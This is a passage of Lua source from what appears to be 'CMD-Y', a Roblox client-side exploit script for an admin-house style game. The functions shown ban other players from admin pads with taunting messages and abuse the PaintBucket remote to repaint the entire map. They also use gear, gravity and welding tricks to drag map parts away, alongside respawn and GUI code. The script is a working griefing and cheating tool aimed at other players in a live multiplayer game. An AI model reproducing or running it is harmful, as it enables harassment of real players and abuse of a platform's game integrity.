					table.remove(permblacklist, table.find(permblacklist, v.Name))
				end
			end
		end


		local function unwl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass, st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and table.find(whitelist, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name then
					if showsm then
						servermsg("[ CMD-Y ] " .. v.Name .. " was just unwhitelisted. Cry!")
					else
						prompt("[ CMD-Y ] " .. v.Name .. " was just unwhitelisted. Cry!")
					end
					table.remove(whitelist, table.find(whitelist, v.Name))
				end
			end
		end

		local function pb(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and not table.find(padbanned, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name and not table.find(UntouchedPlayers, v.UserId) then
					if showsm then
						servermsg("[ CMD-Y ] " .. v.Name .. " was just padbanned. Yikes!")
					else
						prompt("[ CMD-Y ] " .. v.Name .. " was just padbanned. Yikes!")
					end
					table.insert(padbanned, v.Name)
				end
			end
		end

		local function unpb(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and table.find(padbanned, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name then
					if showsm then
						servermsg("[ CMD-Y ] " .. v.Name .. " was just unpadbanned.")
					else
						prompt("[ CMD-Y ] " .. v.Name .. " was just unpadbanned.")
					end
					table.remove(padbanned, table.find(padbanned, v.Name))
				end
			end
		end


		local function returncolor(percent, gkp)
			local leftcolor = gkp[1]
			local rightcolor = gkp[#gkp]

			local lperc = .5
			local color = leftcolor.Value
			for i = 1, #gkp - 1 do
				if gkp[i].Time <= percent and gkp[i + 1].Time >= percent then
					leftcolor = gkp[i]
					rightcolor = gkp[i + 1]

					lperc = (percent - leftcolor.Time) / (rightcolor.Time - leftcolor.Time)
					color = leftcolor.Value:Lerp(rightcolor.Value, lperc)

					return color
				end
			end
		end

		colorAPI.transformToColor3 = function(BrickClr)
			if typeof(BrickClr) == "BrickColor" then
				return BrickClr.Color.R,BrickClr.Color.G,BrickClr.Color.B
			end
		end
		local transformToColor3 = colorAPI.transformToColor3
		colorAPI.color = function(prt, R,G,B)
			local thread = coroutine.create(function()
				local Arguments = {
					["Part"] = prt,
					["Color"] = Color3.new(R,G,B)
				}
				Player.Character.PaintBucket:WaitForChild("Remotes"):WaitForChild("ServerControls"):InvokeServer("PaintPart", Arguments)
			end)
			coroutine.resume(thread)
		end
		colorAPI.colorHouse = function(Extra)
			local OutlinesAndWDWS = Extra.WANDDC
			local Walls = Extra.wallsC
			local Roof = Extra.roofC
			local ChimneyTopParts = Extra.chiC
			for i,v in pairs(house:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						colorAPI.color(v,Walls[1], Walls[2], Walls[3])
					end
					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						colorAPI.color(v,OutlinesAndWDWS[1],OutlinesAndWDWS[2],OutlinesAndWDWS[3])
					end
					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						colorAPI.color(v,Roof[1],Roof[2],Roof[3])
					end
					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" or v.Name == "SmoothBlockModel162" then
						colorAPI.color(v,ChimneyTopParts[1],ChimneyTopParts[2],ChimneyTopParts[3])
					end
					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel9" then
						colorAPI.color(v,Extra.stairsC[1],Extra.stairsC[2],Extra.stairsC[3])
					end
					if v.Name == "SmoothBlockModel97" or v.Name == "SmoothBlockModel52" then
						colorAPI.color(v,Extra.rooftsC[1],Extra.rooftsC[2],Extra.rooftsC[3])
					end
				end))
			end
			colorAPI.color(workspace.Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,Extra.baseC[1],Extra.baseC[2],Extra.baseC[3])
			colorAPI.color(workspace.Terrain._Game.Workspace["Basic House"].SmoothBlockModel112,Extra.floorC[1],Extra.floorC[2],Extra.floorC[3])
		end
		colorAPI.colorBuildingBricks = function(Extra)
			local DarkStoneGrey = Extra.DarkStoneGrey
			local DeepBlue = Extra.DeepBlue
			local NY = Extra.NY
			local IW = Extra.IW
			local LimeGreen = Extra.LimeGreen
			local MSG = Extra.MSG
			local RB = Extra.RB
			local TP = Extra.TP
			local RR = Extra.RR
			for i,v in pairs(bricks:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if v.Name == "Part31" or v.Name == "Part29" or v.Name == "Part55" then
						colorAPI.color(v,DarkStoneGrey[1],DarkStoneGrey[2],DarkStoneGrey[3])
					elseif v.Name == "Part43" or v.Name == "Part3" or v.Name == "Part25" or v.Name == "Part18" or v.Name == "Part11" then
						colorAPI.color(v,DeepBlue[1],DeepBlue[2],DeepBlue[3])
					elseif v.Name == "Part44" or v.Name == "Part6" or v.Name == "Part24" or v.Name == "Part15" or v.Name == "Part12" then
						colorAPI.color(v,NY[1],NY[2],NY[3])
					elseif v.Name == "Part7" or v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" then
						colorAPI.color(v,IW[1], IW[2], IW[3])
					elseif v.Name == "Part5" or v.Name == "Part9" or v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" then
						colorAPI.color(v,LimeGreen[1], LimeGreen[2], LimeGreen[3])
					elseif v.Name == "Part2" or v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part27" then
						colorAPI.color(v,RB[1], RB[2], RB[3])
					elseif v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
						colorAPI.color(v,RR[1], RR[2], RR[3])
					elseif v.Name == "Part45" or v.Name == "Part4" or v.Name == "Part8" or v.Name == "Part20" or v.Name == "Part28" then
						colorAPI.color(v,TP[1], TP[2], TP[3])
					else
						colorAPI.color(v,MSG[1], MSG[2], MSG[3])
					end
				end))
			end
		end
		colorAPI.colorObbyBox = function(R,G,B)
			for i,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					colorAPI.color(v,R,G,B)
				end))
			end
		end
		colorAPI.colorObbyBricks = function(R,G,B)
			for i,brick in pairs(obbyBricks:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					colorAPI.color(brick,R,G,B)
				end))
			end
		end
		colorAPI.colorAdminDivs = function(R,G,B)
			for i,div in pairs(adminDivs:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					colorAPI.color(div,R,G,B)
				end))
			end
		end
		colorAPI.colorPads = function(R,G,B)
			for i,pad in pairs(adminPads:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					colorAPI.color(pad:FindFirstChildOfClass("Part"),R,G,B)
				end))
			end
		end
		colorAPI.colorRegen = function(R,G,B)
			if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
				colorAPI.color(workspace.Terrain._Game.Admin.Regen,R,G,B)
			end    
		end    
		colorAPI.colorPad = function(pad,R,G,B)
			if pad ~= nil and typeof(pad) == "Instance" then
				coroutine.resume(coroutine.create(function()
					colorAPI.color(pad,R,G,B)
				end))    
			end    
		end
		transformToColor3 = colorAPI.transformToColor3
		colorAPI.colorallOriginal = function()

			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorHouse({
						wallsC = {transformToColor3(BrickColor.new("Brick yellow"))},
						baseC = {transformToColor3(BrickColor.new("Bright green"))},
						roofC = {transformToColor3(BrickColor.new("Bright red"))},
						WANDDC = {transformToColor3(BrickColor.new("Dark orange"))},
						stairsC = {transformToColor3(BrickColor.new("Dark stone grey"))},
						floorC = {transformToColor3(BrickColor.new("Medium blue"))},
						rooftsC = {transformToColor3(BrickColor.new("Reddish brown"))},
						chiC = {transformToColor3(BrickColor.new("Sand red"))}
					})
				end)
			end))
			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorBuildingBricks({
						DarkStoneGrey = {transformToColor3(BrickColor.new("Dark stone grey"))},
						DeepBlue = {transformToColor3(BrickColor.new("Deep blue"))},
						NY = {transformToColor3(BrickColor.new("New Yeller"))},
						IW = {transformToColor3(BrickColor.new("Institutional white"))},
						LimeGreen = {transformToColor3(BrickColor.new("Lime green"))},
						MSG = {transformToColor3(BrickColor.new("Medium stone grey"))},
						RB = {transformToColor3(BrickColor.new("Really black"))},
						TP = {transformToColor3(BrickColor.new("Toothpaste"))},
						RR = {transformToColor3(BrickColor.new("Really red"))}
					})
				end)
			end))
			pcall(function()
				colorAPI.color(workspace.Terrain._Game.Workspace.Baseplate,transformToColor3(BrickColor.new("Bright green")))
			end)
			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorObbyBox(transformToColor3(BrickColor.new("Teal")))
				end)
			end))
			coroutine.resume(coroutine.create(function()
				colorAPI.colorObbyBricks(transformToColor3(BrickColor.new("Really red")))
			end))
			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorAdminDivs(transformToColor3(BrickColor.new("Dark stone grey")))
				end)
			end))
			coroutine.resume(coroutine.create(function()
				pcall(function()
					for i,pad in pairs(adminPads:GetChildren()) do
						if pad.Name ~= "Touch to get admin" then
							colorAPI.color(pad:FindFirstChildOfClass("Part"),transformToColor3(BrickColor.new("Bright red"))) 
						else
							colorAPI.color(pad:FindFirstChildOfClass("Part"),transformToColor3(BrickColor.new("Bright green")))
						end      
					end 
				end)
			end))
			pcall(function()
				colorAPI.colorRegen(colorAPI.transformToColor3(BrickColor.new("Bright violet")))
			end)
		end
		local colorallOriginal = colorAPI.colorallOriginal
		local colorAllOriginal = colorAPI.colorallOriginal
		colorAPI.colorallRandom = function()

			if PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			if PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			act("gear me 000000000000000000000000000018474459")
			PlayerService.LocalPlayer.Backpack:WaitForChild("PaintBucket").Parent = PlayerService.LocalPlayer.Character
			local bucket = PlayerService.LocalPlayer.Character:WaitForChild("PaintBucket")
			for i,v in pairs(workspace:GetDescendants()) do
				coroutine.wrap(function()
					if v:IsA("Part") then
						colorAPI.color(v,math.random(0,255),math.random(0,255),math.random(0,255))
					end
				end)()
			end
		end
		local colorAllRandom = colorAPI.colorallRandom
		local colorallRandom = colorAPI.colorallRandom


		local function paintmap(R,G,B)


			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorHouse({
						wallsC = {R,G,B},
						baseC = {R,G,B},
						roofC = {R,G,B},
						WANDDC = {R,G,B},
						stairsC = {R,G,B},
						floorC = {R,G,B},
						rooftsC = {R,G,B},
						chiC = {R,G,B}
					})
				end)
			end))
			coroutine.resume(coroutine.create(function()
				pcall(function()
					colorAPI.colorBuildingBricks({
						DarkStoneGrey = {R,G,B},
						DeepBlue = {R,G,B},
						NY = {R,G,B},
						IW = {R,G,B},
						LimeGreen = {R,G,B},
						MSG = {R,G,B},
						RB = {R,G,B},
						TP = {R,G,B},
						RR = {R,G,B}
					})
				end)
			end))

			colorAPI.colorObbyBox(R,G,B)
			colorAPI.colorObbyBricks(R,G,B)
			colorAPI.colorAdminDivs(R,G,B)
			colorAPI.colorRegen(R,G,B)
			colorAPI.colorPads(R,G,B)
			pcall(function()
				colorAPI.color(workspace.Terrain._Game.Workspace.Baseplate, R,G,B)
			end)
		end

		local function updatecolorpreview(grad, slider, preview, otherpreview)
			local colorminxpos = grad.AbsolutePosition.X
			local colormaxxpos = colorminxpos + grad.AbsoluteSize.X

			local colorXpixel = colormaxxpos - colorminxpos
			local colorsliderx = slider.AbsolutePosition.X


			local colorxpos = (colorsliderx - colorminxpos) / colorXpixel

			local color = returncolor(colorxpos, grad.UIGradient.Color.Keypoints)
			local colorr, colorg, colorb = math.floor(color.R * 255), math.floor(color.G * 255), math.floor(color.B * 255)

			local resultcolor = Color3.fromRGB(colorr, colorg, colorb)

			preview.BackgroundColor3 = resultcolor
			otherpreview.BackgroundColor3 = resultcolor
		end

		local function removelimbs()
			for i,v in pairs(PlayerService.LocalPlayer.Character.Torso:GetChildren()) do
				if v.Name == "Left Shoulder" then
					v:Destroy()
				end
				if v.Name == "Left Hip" then
					v:Destroy()
				end
				if v.Name == "Right Hip" then
					v:Destroy()
				end
			end
		end


		local function tweentransparency(obj, t)
			if obj:IsA("TextLabel") or obj:IsA("TextButton") then
				TS:Create(obj, TweenInfo.new(1.2), {TextTransparency = t}):Play()
			elseif obj:IsA("ImageButton") or obj:IsA("ImageLabel") then
				TS:Create(obj, TweenInfo.new(1.2), {ImageTransparency = t}):Play()
			elseif obj:IsA("Frame") then
				TS:Create(obj, TweenInfo.new(1.2), {BackgroundTransparency = t}):Play()
			end
		end

		local function RJ()
			--local isPrivate = game:HttpGet("https://tuxer.xyz/is.game.private", true)
			prompt("Rejoining...")
			task.wait(.6)
			game:GetService('TeleportService'):Teleport(game.PlaceId)
		end

		local function SHop()

		end

		local function fixgame()
			workspace.Gravity = 198.6
			for _,v in pairs(workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end

		local function forcerespawn()
			if respawning == true then
				return
			else
				respawning = true
				local char = PlayerService.LocalPlayer.Character
				if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
				char:ClearAllChildren()
				local newChar = Instance.new("Model")
				newChar.Parent = workspace
				PlayerService.LocalPlayer.Character = newChar
				wait()
				PlayerService.LocalPlayer.Character = char
				newChar:Destroy()
				respawning = false
			end
		end

		local function allclear()
			if workspace:FindFirstChild(Player.Name) and game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId, 66254) and workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(Player.Name):FindFirstChild("Humanoid").Health > 0 then
				return true
			elseif workspace:FindFirstChild(Player.Name) and Admin.Pads:FindFirstChild(Player.Name .. "'s admin") and workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(Player.Name):FindFirstChild("Humanoid").Health > 0 then
				return true
			else
				movestatus = false
				return false
			end
		end

		local function attach(part)
			if Player.Character.Torso:FindFirstChild("Weld") then
				Player.Character.Torso:FindFirstChild("Weld"):Destroy()
			end
			PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
			local looping = true
			task.spawn(function()
				if Player.Character.Torso:FindFirstChild("Weld") then
					Player.Character.Torso:FindFirstChild("Weld"):Destroy()
				end
				while true do
					fwait()
					if allclear() == true then
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
					elseif allclear() == false then
						forcerespawn()
						fixgame()
						prompt("Something went wrong moving the parts. Fixing game and respawning..")
						looping = false
					end
					if looping == false then break end
				end
			end)
			task.spawn(function() 
				while looping do 
					fwait()
					act("unpunish me")
					if allclear() == false then 
						forcerespawn()
						fixgame()
						prompt("Something went wrong moving the parts. Fixing game and respawning..")
						looping = false
					end 
					if looping == false then break end
				end
			end)

			repeat fwait() Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
			until Player.Character.HumanoidRootPart.CFrame == part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
			repeat 
				fwait() 
				if allclear() == false then
					break
				end
			until 
			Player.Character.Torso:FindFirstChild("Weld")
			looping = false
		end

		task.spawn(function()
			while true do
				wait()
				if allclear() == false and movestatus == true then
					forcerespawn()
					fixgame()
					prompt("MovePart stopped due to no character or no admin, respawning and fixing game..")
				end
			end
		end)


		local function moveobject(part, o)
			if movestatus == false then
				movestatus = true
				if o == 1 then
					if allclear() == true then
						removelimbs()
						task.wait()
						workspace.Gravity = 0
						act("size me .5")

						act("gear me 0000000000000000000000000000000000000108158379")
						repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
						Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
						local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
						local randcoord = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
						Player.Character.HumanoidRootPart.CFrame = randcoord
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						if Player.Character.Torso:FindFirstChild("Weld") then
							Player.Character.Torso:FindFirstChild("Weld"):Destroy()
						end
						task.wait(.25)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.25)
						attach(part)
						task.wait(.25)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.25)
						movestatus = false
					else
						prompt("Something went wrong removing the parts.")
						forcerespawn()
						fixgame()
					end
				elseif o == 2 then
					local loop = false
					if allclear() == true then
						removelimbs()
						task.wait()
						act("size me .5")
						workspace.Gravity = 0

						act("gear me 0000000000000000000000000000000000000108158379")
						repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
						Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
						local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
						local newcoord = CFrame.new(ogcframes[part.Name][1],ogcframes[part.Name][2],ogcframes[part.Name][3],ogcframes[part.Name][4],ogcframes[part.Name][5],ogcframes[part.Name][6],ogcframes[part.Name][7],ogcframes[part.Name][8],ogcframes[part.Name][9],ogcframes[part.Name][10],ogcframes[part.Name][11],ogcframes[part.Name][12]) * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
						loop = true
						task.spawn(function()
							while loop do
								fwait() 
								Player.Character.HumanoidRootPart.CFrame = newcoord
								if loop == false then break end
							end
						end)
						repeat fwait() 
						until Player.Character.HumanoidRootPart.CFrame == newcoord
						loop = false
						if Player.Character.Torso:FindFirstChild("Weld") then
							Player.Character.Torso:FindFirstChild("Weld"):Destroy()
						end
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						task.wait(.25)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.25)
						attach(part)
						task.wait(.25)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.25)
						movestatus = false
					else
						loop = false
						forcerespawn()
						fixgame()
						prompt("Something went wrong removing the parts.")
					end
				elseif o == 3 then
					if allclear() == true then
						removelimbs()
						task.wait()
						act("size me .5")
						workspace.Gravity = 0

						act("gear me 0000000000000000000000000000000000000108158379")
						repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
						Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
						local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
						local randcoord = CFrame.new(0, math.random(-14950, -15000), 0)
						Player.Character.HumanoidRootPart.CFrame = randcoord
						if Player.Character.Torso:FindFirstChild("Weld") then
							Player.Character.Torso:FindFirstChild("Weld"):Destroy()
						end
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
						task.wait(.25)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.05)
						attach(part)
						task.wait(.05)
						if not Player.Character:FindFirstChild("IvoryPeriastron") then
							fixgame()
							forcerespawn()
							movestatus = false
							return
						end
						ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
						task.wait(.25)
						movestatus = false
					else
						prompt("Something went wrong removing the parts.")
						forcerespawn()
						fixgame()
					end
				end
			end
		end

		local function cogui(o)
			if o == 1 then
				Cont:TweenSize(UDim2.new(0, 102,0, 27), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				for _,v in pairs(Cont:GetDescendants()) do
					if v.Name ~= LoadingText.Name and v.Name ~= CO.Name and v.Parent ~= TopBar then
						tweentransparency(v, 1)
					end
				end


				TopBar:TweenSize(UDim2.new(0, 101,0, 29), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				Rejoin:TweenPosition(UDim2.new(0.584, 0,0.207, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				ServerHop:TweenPosition(UDim2.new(0.29, 0,0.103, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				CO:TweenPosition(UDim2.new(0.806, 0,0.241, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
				TS:Create(CMDLabel, TweenInfo.new(.23), {TextTransparency = 1}):Play()
			elseif o == 2 then
				Cont:TweenSize(UDim2.new(0, 409,0, 338), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 1, true)
